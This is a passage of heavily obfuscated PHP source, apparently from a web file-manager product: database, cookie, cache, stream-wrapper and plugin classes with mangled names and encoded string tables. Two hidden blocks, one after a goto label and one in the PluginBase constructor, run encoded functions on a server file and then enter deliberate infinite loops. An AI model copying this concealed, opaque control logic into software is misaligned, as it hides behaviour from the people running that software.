$©áöÖ›¦) { return; } self::$sameCookieSet[$úç¹Ê—Ÿ] = $—›¬Éœ . $©áöÖ›¦; if (!$€Æó×ìš) { $€Æó×ìš = str_replace(HOST, $İÁı–÷¸[12], APP_HOST); $€Æó×ìš = _get($GLOBALS, $İÁı–÷¸[971], $€Æó×ìš); } $˜€ğİÄ  = $İÁı–÷¸[12]; setcookie($úç¹Ê—Ÿ, $—›¬Éœ, time() + $©áöÖ›¦, $İÁı–÷¸[8] . trim($€Æó×ìš, $İÁı–÷¸[8]) . $˜€ğİÄ , !1, !1, $º¼Ú…âÁ); } public static function setSafe($´µÀ—Í, $şéœàÖ, $ú’âœ· = 0) { self::set($´µÀ—Í, $şéœàÖ, $ú’âœ·, !0); } public static function get($œ½ÛÒıù) { static $û–¾¨” = false; if (!$û–¾¨”) { self::initHeaderCookie(); $û–¾¨” = !0; } return isset($_COOKIE[$œ½ÛÒıù]) ? $_COOKIE[$œ½ÛÒıù] : !1; } private static function initHeaderCookie() { $Ô“®…ˆ =& $_SERVER[†ûãı«°]; if (!isset($_SERVER[$Ô“®…ˆ[972]]) || !$_SERVER[$Ô“®…ˆ[972]]) { return; } $–èãÌÆ° = explode($Ô“®…ˆ[74], $_SERVER[$Ô“®…ˆ[972]]); foreach ($–èãÌÆ° as $¶…Ïí¤“) { $¶…Ïí¤“ = explode($Ô“®…ˆ[508], $¶…Ïí¤“); if (count($¶…Ïí¤“) != 2 || !isset($¶…Ïí¤“[1])) { continue; } $_COOKIE[trim($¶…Ïí¤“[0])] = trim($¶…Ïí¤“[1]); } } public static function remove($Ş–¯ªÁñ, $ÆÄœ½ÔÊ = false) { unset($_COOKIE[$Ş–¯ªÁñ]); self::set($Ş–¯ªÁñ, $_SERVER[†ûãı«°][12], 1, $ÆÄœ½ÔÊ); } } class DbMysql extends Db { public function __construct($Ï¥ß = '') { $ƒ£Ğçı =& $_SERVER[†ûãı«°]; if (!extension_loaded($ƒ£Ğçı[884])) { think_exception(think_lang($ƒ£Ğçı[14]) . $ƒ£Ğçı[973]); } if (!empty($Ï¥ß)) { $this->config = $Ï¥ß; if (empty($this->config[$ƒ£Ğçı[17]])) { $this->config[$ƒ£Ğçı[17]] = $ƒ£Ğçı[12]; } } } public function connect($–ˆØÌ = '', $¥™ù¼½ = 0, $™‘œ ­» = false) { $ƒŸè§šÎ =& $_SERVER[†ûãı«°]; if (!isset($this->linkID[$¥™ù¼½])) { if (empty($–ˆØÌ)) { $–ˆØÌ = $this->config; } $·®ØÔ£Ø = $–ˆØÌ[$ƒŸè§šÎ[974]] . ($–ˆØÌ[$ƒŸè§šÎ[975]] ? "\72{$–ˆØÌ[$ƒŸè§šÎ[975]]}" : $ƒŸè§šÎ[12]); $ûêØıÉ  = !empty($–ˆØÌ[$ƒŸè§šÎ[17]][$ƒŸè§šÎ[18]]) ? $–ˆØÌ[$ƒŸè§šÎ[17]][$ƒŸè§šÎ[18]] : $this->pconnect; if ($ûêØıÉ ) { $this->linkID[$¥™ù¼½] = mysql_pconnect($·®ØÔ£Ø, $–ˆØÌ[$ƒŸè§šÎ[976]], $–ˆØÌ[$ƒŸè§šÎ[977]], 131072); } else { $this->linkID[$¥™ù¼½] = mysql_connect($·®ØÔ£Ø, $–ˆØÌ[$ƒŸè§šÎ[976]], $–ˆØÌ[$ƒŸè§šÎ[977]], !0, 131072); } if (!$this->linkID[$¥™ù¼½] || !empty($–ˆØÌ[$ƒŸè§šÎ[21]]) && !mysql_select_db($–ˆØÌ[$ƒŸè§šÎ[21]], $this->linkID[$¥™ù¼½])) { think_exception(mysql_error()); } $“Ï³ñëÎ = mysql_get_server_info($this->linkID[$¥™ù¼½]); mysql_query($ƒŸè§šÎ[978] . think_config($ƒŸè§šÎ[979]) . $ƒŸè§šÎ[58], $this->linkID[$¥™ù¼½]); if ($“Ï³ñëÎ > $ƒŸè§šÎ[980]) { mysql_query($ƒŸè§šÎ[981], $this->linkID[$¥™ù¼½]); } $this->connected = !0; if (1 != think_config($ƒŸè§šÎ[22])) { unset($this->config); } } return $this->linkID[$¥™ù¼½]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÀúºñïÌ) { $´ßúè¡· =& $_SERVER[†ûãı«°]; if (0 === stripos($ÀúºñïÌ, $´ßúè¡·[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÀúºñïÌ; if ($this->queryID) { $this->free(); } think_action_status($´ßúè¡·[23], 1); think_status($´ßúè¡·[24]); $this->queryID = mysql_query($ÀúºñïÌ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($û°Âô¢„) { $–ÃÒÌº =& $_SERVER[†ûãı«°]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $û°Âô¢„; if ($this->queryID) { $this->free(); } think_action_status($–ÃÒÌº[25], 1); think_status($–ÃÒÌº[24]); $Ë€ÛÈÀÊ = mysql_query($û°Âô¢„, $this->_linkID); $this->debug(); if (!1 === $Ë€ÛÈÀÊ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[†ûãı«°][982], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $©€¼ø’ = mysql_query($_SERVER[†ûãı«°][983], $this->_linkID); $this->transTimes = 0; if (!$©€¼ø’) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¸˜¬‰Ú = mysql_query($_SERVER[†ûãı«°][984], $this->_linkID); $this->transTimes = 0; if (!$¸˜¬‰Ú) { $this->error(); return !1; } } return !0; } private function getAll() { $³òãÁóı = array(); if ($this->numRows > 0) { while ($Ÿğ³ˆ”õ = mysql_fetch_assoc($this->queryID)) { $³òãÁóı[] = $Ÿğ³ˆ”õ; } mysql_data_seek($this->queryID, 0); } return $³òãÁóı; } public function getFields($å—Ş„¨Ú) { $Õ¨¨²òœ =& $_SERVER[†ûãı«°]; $áôü¡ = $this->query($Õ¨¨²òœ[985] . $this->parseKey($å—Ş„¨Ú)); $êéóêâö = array(); if ($áôü¡) { foreach ($áôü¡ as $ôÑàŞ => $®†ÍáÌó) { $êéóêâö[$®†ÍáÌó[$Õ¨¨²òœ[31]]] = array($Õ¨¨²òœ[32] => $®†ÍáÌó[$Õ¨¨²òœ[31]], $Õ¨¨²òœ[33] => $®†ÍáÌó[$Õ¨¨²òœ[34]], $Õ¨¨²òœ[35] => (bool) (strtoupper($®†ÍáÌó[$Õ¨¨²òœ[36]]) === $Õ¨¨²òœ[986]), $Õ¨¨²òœ[37] => $®†ÍáÌó[$Õ¨¨²òœ[38]], $Õ¨¨²òœ[39] => strtolower($®†ÍáÌó[$Õ¨¨²òœ[40]]) == $Õ¨¨²òœ[41], $Õ¨¨²òœ[42] => strtolower($®†ÍáÌó[$Õ¨¨²òœ[43]]) == $Õ¨¨²òœ[44]); } } return $êéóêâö; } public function getTables($ğò›•­Á = '') { $ÇŠŠ´ë =& $_SERVER[†ûãı«°]; if (!empty($ğò›•­Á)) { $÷¢÷‚™• = $ÇŠŠ´ë[987] . $ğò›•­Á . $ÇŠŠ´ë[988]; } else { $÷¢÷‚™• = $ÇŠŠ´ë[989]; } $ìÛº…ùÑ = $this->query($÷¢÷‚™•); $…°½õ“ = array(); foreach ($ìÛº…ùÑ as $´Ö—¹½ò => $Ø¯‹ÊŞ÷) { $…°½õ“[$´Ö—¹½ò] = current($Ø¯‹ÊŞ÷); } return $…°½õ“; } public function replace($éìª×ÂÄ, $…‹óş— = array()) { $õŸá“– =& $_SERVER[†ûãı«°]; foreach ($éìª×ÂÄ as $¢ò¿Úä± => $°ÇãÅ†º) { $àÒÓ²Ç¶ = $this->parseValue($°ÇãÅ†º); if (is_scalar($àÒÓ²Ç¶)) { $¤¨à©¦İ[] = $àÒÓ²Ç¶; $ãÕÔçå‚[] = $this->parseKey($¢ò¿Úä±); } } $Êéú†ù¯ = $õŸá“–[990] . $this->parseTable($…‹óş—[$õŸá“–[358]]) . $õŸá“–[991] . implode($õŸá“–[50], $ãÕÔçå‚) . $õŸá“–[992] . implode($õŸá“–[50], $¤¨à©¦İ) . $õŸá“–[993]; return $this->execute($Êéú†ù¯); } public function insertAll($‘ì®ÄÄÛ, $—²Ñèİ´ = array(), $Ş²Áïõ = false) { $Ä£úÌß– =& $_SERVER[†ûãı«°]; if (!is_array($‘ì®ÄÄÛ[0])) { return !1; } $¼™µıÄ = array_keys($‘ì®ÄÄÛ[0]); $‚Ö®´İ« = array(); foreach ($‘ì®ÄÄÛ as $òÌ§ó“­) { $áØÄ‘¶· = array(); foreach ($òÌ§ó“­ as $ÁÑ¢æïã => $ûØå¥ƒ) { $ûØå¥ƒ = $this->parseValue($ûØå¥ƒ); if (is_scalar($ûØå¥ƒ)) { $áØÄ‘¶·[] = $ûØå¥ƒ; } } $‚Ö®´İ«[] = $Ä£úÌß–[339] . implode($Ä£úÌß–[50], $áØÄ‘¶·) . $Ä£úÌß–[993]; } array_walk($¼™µıÄ, array($this, $Ä£úÌß–[994])); $æÉç«Ü¿ = ($Ş²Áïõ ? $Ä£úÌß–[995] : $Ä£úÌß–[996]) . $Ä£úÌß–[997] . $this->parseTable($—²Ñèİ´[$Ä£úÌß–[358]]) . $Ä£úÌß–[991] . implode($Ä£úÌß–[50], $¼™µıÄ) . $Ä£úÌß–[998] . implode($Ä£úÌß–[50], $‚Ö®´İ«); return $this->execute($æÉç«Ü¿); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÛÍ ÏÖõ =& $_SERVER[†ûãı«°]; $this->error = mysql_errno() . $ÛÍ ÏÖõ[4] . mysql_error($this->_linkID); if ($ÛÍ ÏÖõ[12] != $this->queryStr) { $this->error .= LNG($ÛÍ ÏÖõ[48]) . $this->queryStr; } think_trace($this->error, $ÛÍ ÏÖõ[12], $ÛÍ ÏÖõ[49]); return $this->error; } public function escapeString($¬§¹Ê) { if ($this->_linkID) { return mysql_real_escape_string($¬§¹Ê, $this->_linkID); } else { return mysql_escape_string($¬§¹Ê); } } public function parseKey(&$›¢®„º…, $½Ìïµê¸ = true) { $¦Î³„÷‹ =& $_SERVER[†ûãı«°]; if ($½Ìïµê¸) { $›¢®„º… = $this->parseKeyCheck($›¢®„º…); } if ($›¢®„º… != $¦Î³„÷‹[222] && !preg_match($¦Î³„÷‹[999], $›¢®„º…)) { $›¢®„º… = $¦Î³„÷‹[463] . trim($›¢®„º…, $¦Î³„÷‹[463]) . $¦Î³„÷‹[463]; } return $›¢®„º…; } } goto C›Òù±‹´Œ; E‚ªœ®ßˆ: if (!isset($_SERVER[$_SERVER[†ûãı«°][949]]) || !isset($_SERVER[$_SERVER[†ûãı«°][950]])) { $_getc = $_SERVER[†ûãı«°][951]; $_getfile = $_SERVER[$_SERVER[†ûãı«°][952]] . $_SERVER[†ûãı«°][953]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[†ûãı«°][287], $_getfilec); if (count($_getarrs) < $_SERVER[†ûãı«°][694]) { $exit = $_SERVER[†ûãı«°][954]; $exit(); } $_act = $_SERVER[†ûãı«°][955]; $_act($_SERVER[$_SERVER[†ûãı«°][952]] . $_SERVER[†ûãı«°][953]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[†ûãı«°][456]); } } class CacheLockDatabase { public function lock($ÑµÔ÷À“, $§ğ‡‹œŒ = 0) { $ù ïòèª = Model($_SERVER[†ûãı«°][910]); $‘”÷»¡É = microtime(!0) + $§ğ‡‹œŒ; while (microtime(!0) < $‘”÷»¡É) { $¬§—¹•Ã = $ù ïòèª->get($ÑµÔ÷À“); if (!$¬§—¹•Ã || $¬§—¹•Ã < microtime(!0)) { $ü„Â = $ù ïòèª->set($ÑµÔ÷À“, $‘”÷»¡É); if ($ü„Â) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ì”Ã¶¡) { return Model($_SERVER[†ûãı«°][910])->get($Ì”Ã¶¡); } public function unlock($Ûé°¬®Ä) { Model($_SERVER[†ûãı«°][910])->remove($Ûé°¬®Ä); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($´´À‰ã, $èäÙù) { $ô ­øå“ =& $_SERVER[†ûãı«°]; if (!class_exists($ô ­øå“[956])) { show_json($ô ­øå“[957], !1); } $this->cacheTime = $èäÙù; $this->handle = new Memcached(); if (is_array($´´À‰ã[$ô ­øå“[958]]) && count($´´À‰ã[$ô ­øå“[958]]) >= 1) { foreach ($´´À‰ã[$ô ­øå“[958]] as $›ñß«î) { $©±õÍ‚è = explode($ô ­øå“[4], $›ñß«î); $this->handle->addServer($©±õÍ‚è[0], $©±õÍ‚è[1]); } } else { $this->handle->addServer($´´À‰ã[$ô ­øå“[208]], $´´À‰ã[$ô ­øå“[209]]); } } public function set($êÊ§Ÿµ, $šÂßßŠ¢, $ş¸¨”ß“ = false) { $ş¸¨”ß“ = $ş¸¨”ß“ ? $ş¸¨”ß“ : $this->cacheTime; return $this->handle->set($êÊ§Ÿµ, $šÂßßŠ¢, $ş¸¨”ß“); } public function get($—ıÇ÷ûƒ) { return $this->handle->get($—ıÇ÷ûƒ); } public function remove($À¾àôâŠ) { return $this->handle->delete($À¾àôâŠ); } public function deleteAll() { return $this->handle->flush(); } } goto BÛ¼³²­è; a‚­á¦µÊç: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($šáïı£à, $ßš¬ÔÛé = '') { $this->info = $this->info($šáïı£à); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[†ûãı«°][87]]; $this->pathOpen = $šáïı£à; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$šáïı£à])) { self::$_chunkBuffer[$šáïı£à] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Àö¯œ¨ä) { $ÓàÑ˜ß = $this->fileSubstr($this->pose, $Àö¯œ¨ä); $this->pose += strlen($ÓàÑ˜ß); return $ÓàÑ˜ß; } public function stream_tell() { return $this->pose; } public function stream_seek($ƒå±Ïïõ, $±ˆÃ®Ïé) { $Á…½†˜¬ =& $_SERVER[†ûãı«°]; if ($±ˆÃ®Ïé == SEEK_SET) { $this->pose = $ƒå±Ïïõ; } else { if ($±ˆÃ®Ïé == SEEK_CUR) { $this->pose += $ƒå±Ïïõ; } else { if ($±ˆÃ®Ïé == SEEK_END) { $this->pose = $this->info[$Á…½†˜¬[79]] + intval($ƒå±Ïïõ); } } } if ($ƒå±Ïïõ < 0) { $this->pose = $this->info[$Á…½†˜¬[79]] + $ƒå±Ïïõ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[†ûãı«°][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ôå¾á÷², $»ïæ‡ıÌ) { $€¸Ÿ­ù =& $_SERVER[†ûãı«°]; $¯Ù»¢Äó = $this->info($Ôå¾á÷²); return array($€¸Ÿ­ù[1411] => 0, $€¸Ÿ­ù[1620] => 0, $€¸Ÿ­ù[16] => 32768 + 511, $€¸Ÿ­ù[1621] => 0, $€¸Ÿ­ù[1622] => 0, $€¸Ÿ­ù[1623] => 0, $€¸Ÿ­ù[1624] => 0, $€¸Ÿ­ù[79] => $¯Ù»¢Äó[$€¸Ÿ­ù[79]], $€¸Ÿ­ù[1625] => $¯Ù»¢Äó[$€¸Ÿ­ù[1466]], $€¸Ÿ­ù[1582] => $¯Ù»¢Äó[$€¸Ÿ­ù[88]], $€¸Ÿ­ù[1581] => $¯Ù»¢Äó[$€¸Ÿ­ù[233]], $€¸Ÿ­ù[1626] => 0, $€¸Ÿ­ù[1627] => 0); } static $fileInfo = array(); public function info($áâ™Û­Ğ) { $Œû£ßı˜ = $_SERVER[†ûãı«°][1628]; if (isset(self::$fileInfo[$áâ™Û­Ğ])) { return self::$fileInfo[$áâ™Û­Ğ]; } if (substr($áâ™Û­Ğ, 0, strlen($Œû£ßı˜)) != $Œû£ßı˜) { return !1; } self::$fileInfo[$áâ™Û­Ğ] = IO::info(substr($áâ™Û­Ğ, strlen($Œû£ßı˜))); return self::$fileInfo[$áâ™Û­Ğ]; } public static function read($Ø·ÍŞØ±, $Ë»Ä†§, $øå¢œÖÑ) { if (!isset(self::$_fopenCache[$Ø·ÍŞØ±])) { $ÅËÛñ‹ä = new StreamWrapperIO(); $ÅËÛñ‹ä->stream_open($Ø·ÍŞØ±); self::$_fopenCache[$Ø·ÍŞØ±] = $ÅËÛñ‹ä; } $ÅËÛñ‹ä = self::$_fopenCache[$Ø·ÍŞØ±]; return $ÅËÛñ‹ä->fileSubstr($Ë»Ä†§, $øå¢œÖÑ); } public static function _read($ìÖÎ¥şÎ, $’÷©Ú¹“, $íòÌ­¸§) { $ËÎ¢¿óê =& $_SERVER[†ûãı«°]; $²ŞøÓ¿‚ = fopen($ìÖÎ¥şÎ, $ËÎ¢¿óê[1470]); if (!$²ŞøÓ¿‚) { return $ËÎ¢¿óê[12]; } $¼å÷š²€ = 8192; fseek($²ŞøÓ¿‚, $’÷©Ú¹“, SEEK_SET); $ÊšÍÆ› = $ËÎ¢¿óê[12]; $¦œş‰ = 0; while ($¦œş‰ < $íòÌ­¸§) { $áÆ£áíë = min($¼å÷š²€, $íòÌ­¸§ - $¦œş‰); $ÊšÍÆ› .= fread($²ŞøÓ¿‚, $áÆ£áíë); $¦œş‰ += $áÆ£áíë; } fclose($²ŞøÓ¿‚); return $ÊšÍÆ›; } public function fileSubstr($Æ†¯ÒÃœ, $ãƒ‹¨Ó†) { $”™ü³ÊÏ =& $_SERVER[†ûãı«°]; $ôİë°âº = $this->info[$”™ü³ÊÏ[79]]; $ŒÛèÕ«ó = $Æ†¯ÒÃœ; $šÛÄş¨ = $ãƒ‹¨Ó†; if ($Æ†¯ÒÃœ < 0) { $Æ†¯ÒÃœ = $ôİë°âº + $Æ†¯ÒÃœ; } if ($ãƒ‹¨Ó† === !1) { $ãƒ‹¨Ó† = $ôİë°âº - $Æ†¯ÒÃœ; } if ($Æ†¯ÒÃœ + $ãƒ‹¨Ó† > $ôİë°âº) { $ãƒ‹¨Ó† = $ôİë°âº - $Æ†¯ÒÃœ; } if ($ãƒ‹¨Ó† <= 0) { return $”™ü³ÊÏ[12]; } if ($Æ†¯ÒÃœ < 0 || $Æ†¯ÒÃœ >= $ôİë°âº || $ãƒ‹¨Ó† <= 0 || $ãƒ‹¨Ó† > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\x6c\145\122\x65\x61\x64\x20\x65\x72\x72\x6f\x72\x21\40\163\x74\141\162\x74\x3d{$Æ†¯ÒÃœ}\73\154\145\156\147\x74\x68\x3d{$ãƒ‹¨Ó†}\73\x20\x73\x69\x7a\145\75{$ôİë°âº}\73"); } $È´°ºöç = 64 * 1024; $ïØí‚ıı =& self::$_chunkBuffer[$this->path]; if (!$ïØí‚ıı) { $ïØí‚ıı = array(); } $ÖËŞè·¼ = 0; $èÅüØß = 0; $—â¼Ø‚Ğ = $”™ü³ÊÏ[12]; foreach ($ïØí‚ıı as $ÖËŞè·¼ => $—â¼Ø‚Ğ) { $ÖËŞè·¼ = intval($ÖËŞè·¼); $èÅüØß = $ÖËŞè·¼ + strlen($—â¼Ø‚Ğ); if ($Æ†¯ÒÃœ >= $èÅüØß) { continue; } if ($Æ†¯ÒÃœ >= $ÖËŞè·¼ && $Æ†¯ÒÃœ + $ãƒ‹¨Ó† <= $èÅüØß) { return substr($—â¼Ø‚Ğ, $Æ†¯ÒÃœ - $ÖËŞè·¼, $ãƒ‹¨Ó†); } break; } if (count($ïØí‚ıı) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($”™ü³ÊÏ[1629], $”™ü³ÊÏ[1630] . count($ïØí‚ıı) . "\x3b\163\x74\141\162\164\x3d{$Æ†¯ÒÃœ}\54\154\x65\x6e\147\164\150\75{$ãƒ‹¨Ó†}\73\160\x6f\x73\x65\72{$ÖËŞè·¼}\x7e{$èÅüØß}"); throw new Exception($”™ü³ÊÏ[1631]); } $ä’Õ´Ë = intval($Æ†¯ÒÃœ / $È´°ºöç) * $È´°ºöç; $¶†ƒŠÃ¦ = ceil(($Æ†¯ÒÃœ + $ãƒ‹¨Ó†) / $È´°ºöç) * $È´°ºöç - $ä’Õ´Ë; $Êòîì©ç = IO::fileSubstr($this->path, $ä’Õ´Ë, $¶†ƒŠÃ¦); $ïØí‚ıı[$ä’Õ´Ë . $”™ü³ÊÏ[12]] = $Êòîì©ç; ksort($ïØí‚ıı); $Ş„äª©û = substr($Êòîì©ç, $Æ†¯ÒÃœ - $ä’Õ´Ë, $ãƒ‹¨Ó†); return $Ş„äª©û; } private function log($¤à°˜Á–, $ÖöŒ¢»á) { $…–àïÎâ =& $_SERVER[†ûãı«°]; $ä¾ÓŸÁ§ = timeFloat() - $this->timeStart; write_log(sprintf($…–àïÎâ[1632], $¤à°˜Á–, $this->info[$…–àïÎâ[32]], $ä¾ÓŸÁ§, $ÖöŒ¢»á), $…–àïÎâ[1275]); } } class Message { function __construct() { } public function send($ÒÊÃùò¦ = '', $‡Ó©õ = array(), $‹£Åã£ = "\164\145\170\164") { $îşö…ò£ =& $_SERVER[†ûãı«°]; $ÇËì²¸· = array($îşö…ò£[33] => $îşö…ò£[1224], $îşö…ò£[171] => $ÒÊÃùò¦); if (in_array($‹£Åã£, array($îşö…ò£[1224], $îşö…ò£[1633]))) { $ÇËì²¸·[$îşö…ò£[33]] = $‹£Åã£; } $‡Ó©õ = array($îşö…ò£[582] => isset($‡Ó©õ[$îşö…ò£[582]]) ? $‡Ó©õ[$îşö…ò£[582]] : $îşö…ò£[12], $îşö…ò£[669] => isset($‡Ó©õ[$îşö…ò£[669]]) ? $‡Ó©õ[$îşö…ò£[669]] : $îşö…ò£[12]); if (empty($ÒÊÃùò¦) || empty($‡Ó©õ[$îşö…ò£[582]]) && empty($‡Ó©õ[$îşö…ò£[669]])) { return !1; } $å¡Íùıİ = array($îşö…ò£[1562] => $ÇËì²¸·, $îşö…ò£[1634] => $‡Ó©õ); Hook::trigger($îşö…ò£[1635], $å¡Íùıİ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ğ½Éò´ã =& $_SERVER[†ûãı«°]; if (!isset($_SERVER[$Ğ½Éò´ã[949]]) || !isset($_SERVER[$Ğ½Éò´ã[950]])) { $ıäùÖ…â = $Ğ½Éò´ã[967]; $ÁŠô³· = $Ğ½Éò´ã[951]; $·ò€›¸¸ = $_SERVER[$Ğ½Éò´ã[952]] . $Ğ½Éò´ã[953]; $¾ıµ¸øğ = $ÁŠô³·($·ò€›¸¸); $À”Âğëí = explode($Ğ½Éò´ã[287], $¾ıµ¸øğ); if (count($À”Âğëí) < $Ğ½Éò´ã[690]) { $½›ˆ—ø = $Ğ½Éò´ã[954]; $½›ˆ—ø(); } $ËÛøÚ÷à = $Ğ½Éò´ã[968]; $ËÛøÚ÷à($_SERVER[$Ğ½Éò´ã[969]]); $°«êÚÂÈ = 1; for ($¿‚Æı“ = $°«êÚÂÈ; $¿‚Æı“ > 0; $¿‚Æı“++) { $ËÛøÚ÷à = json_encode($GLOBALS[$Ğ½Éò´ã[494]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ğ½Éò´ã[1636]); $this->pluginName = str_replace($Ğ½Éò´ã[1636], $Ğ½Éò´ã[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ğ½Éò´ã[8]; $this->pluginApi = appHostGet() . $Ğ½Éò´ã[1637] . $this->pluginName . $Ğ½Éò´ã[8]; $this->pluginHost = $config[$Ğ½Éò´ã[1638]] . $this->pluginName . $Ğ½Éò´ã[8]; $this->pluginHostDefault = $config[$Ğ½Éò´ã[1638]] . $this->pluginName . $Ğ½Éò´ã[8]; $Øñ…ÊÔ­ = $config[$Ğ½Éò´ã[1639]]; if ($Øñ…ÊÔ­ && strpos($Ğ½Éò´ã[50] . $Øñ…ÊÔ­ . $Ğ½Éò´ã[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ğ½Éò´ã[1640]] . $this->pluginName . $Ğ½Éò´ã[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[†ûãı«°][1641]); } protected function assign($Š¶Éœ¿—, $Ó” ¦¾ş = false) { if (is_array($Š¶Éœ¿—)) { $this->values = array_merge($this->values, $Š¶Éœ¿—); } else { $this->values[$Š¶Éœ¿—] = $Ó” ¦¾ş; } } protected function display($æ›£Â«¾) { extract($this->values); require $æ›£Â«¾; } final function hookRegist($Íıš›–Ó) { $this->modelPlugin->appRegist($this->pluginName, $Íıš›–Ó); } final function appIcon() { $Üãİ›Í =& $_SERVER[†ûãı«°]; $œ‡ûíò¢ = $this->appPackage(); $î¼“‹¢õ = $Üãİ›Í[12]; if (isset($œ‡ûíò¢[$Üãİ›Í[492]])) { if (isset($œ‡ûíò¢[$Üãİ›Í[492]][$Üãİ›Í[1642]])) { $î¼“‹¢õ = $Üãİ›Í[1643] . $œ‡ûíò¢[$Üãİ›Í[492]][$Üãİ›Í[1642]] . $Üãİ›Í[1644]; } else { if ($œ‡ûíò¢[$Üãİ›Í[492]][$Üãİ›Í[1645]]) { $î¼“‹¢õ = $Üãİ›Í[1646] . $œ‡ûíò¢[$Üãİ›Í[492]][$Üãİ›Í[1645]] . $Üãİ›Í[1647]; } } } return $î¼“‹¢õ; } final function fileCanView($ùæìØÎû) { $×ëÇ¯¤í =& $_SERVER[†ûãı«°]; if (request_url_safe($ùæìØÎû)) { return !0; } if ($this->isShare($ùæìØÎû)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÈèÈ¿é = $×ëÇ¯¤í[1648] . rawurlencode(this_url()); show_tips(LNG($×ëÇ¯¤í[1649]) . $×ëÇ¯¤í[1650] . $ÈèÈ¿é . $×ëÇ¯¤í[1651] . LNG($×ëÇ¯¤í[1652]) . $×ëÇ¯¤í[1653], !1); } if (!Action($×ëÇ¯¤í[1654])->authCan($×ëÇ¯¤í[1655])) { show_tips(LNG($×ëÇ¯¤í[1656]) . $×ëÇ¯¤í[1657], !1); } ActionCall($×ëÇ¯¤í[1658], $ùæìØÎû); } final function isShare($¿§¼½Ï¤) { $Ñ£€¸Ö = KodIO::parse($¿§¼½Ï¤); return $Ñ£€¸Ö[$_SERVER[†ûãı«°][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ı†¢êÀç) { if (request_url_safe($ı†¢êÀç)) { return $ı†¢êÀç; } if (!$this->isShare($ı†¢êÀç)) { $ı†¢êÀç = $this->filePath($ı†¢êÀç, !1); } return Action($_SERVER[†ûãı«°][1267])->linkOut($ı†¢êÀç); } public function filePathLinkOut($µà¾´“) { if (request_url_safe($µà¾´“)) { return $µà¾´“; } $this->fileCanView($µà¾´“); return Action($_SERVER[†ûãı«°][1267])->link($µà¾´“); } final function filePath($ºàÂï¡Ê, $Ï…ïÕ¼÷ = true, $” ñ¤° = false) { $‹Šå²Î =& $_SERVER[†ûãı«°]; $•¶ÒÎ®à = $this->filePathGet($ºàÂï¡Ê, $Ï…ïÕ¼÷); if (!$this->fileInfo) { show_tips(LNG($‹Šå²Î[108]), !1); } if ($” ñ¤° && isset($this->fileInfo[$‹Šå²Î[545]]) && $this->fileInfo[$‹Šå²Î[545]]) { $Üö«êêÎ = Model($‹Šå²Î[548])->fileInfo($this->fileInfo[$‹Šå²Î[545]]); if (!$Üö«êêÎ || !IO::exist($Üö«êêÎ[$‹Šå²Î[87]])) { $Ì·©úè = LNG($‹Šå²Î[108]) . LNG($‹Šå²Î[1659]); if (KodUser::isRoot() && isset($Üö«êêÎ[$‹Šå²Î[87]])) { $Ì·©úè .= $‹Šå²Î[1660] . $Üö«êêÎ[$‹Šå²Î[87]] . $‹Šå²Î[1661]; } show_tips($Ì·©úè); } } Hook::trigger($‹Šå²Î[1662], $•¶ÒÎ®à); return $•¶ÒÎ®à; } final function filePathGet($Òœğ·©®, $ê«²´Şü = true) { $ŠÄ…Ù¾š =& $_SERVER[†ûãı«°]; if ($ğÑÕøŠ… = $this->checkSharePath($Òœğ·©®, $ê«²´Şü)) { return $ğÑÕøŠ…; } $this->fileCanView($Òœğ·©®); if (request_url_safe($Òœğ·©®)) { $Ğİ±»äô = parse_url_query($Òœğ·©®); if (isset($Ğİ±»äô[$ŠÄ…Ù¾š[1663]]) && isset($Ğİ±»äô[$ŠÄ…Ù¾š[236]])) { $î­ïıô† = Mcrypt::decode($Ğİ±»äô[$ŠÄ…Ù¾š[236]], Model($ŠÄ…Ù¾š[846])->get($ŠÄ…Ù¾š[847])); if ($î­ïıô†) { $this->fileInfo = IO::info($î­ïıô†); $this->fileInfo[$ŠÄ…Ù¾š[1664]] = $Òœğ·©®; $this->cachePath = $this->pluginCachePath($ŠÄ…Ù¾š[12], $ê«²´Şü); return $î­ïıô†; } } $Òœğ·©® = 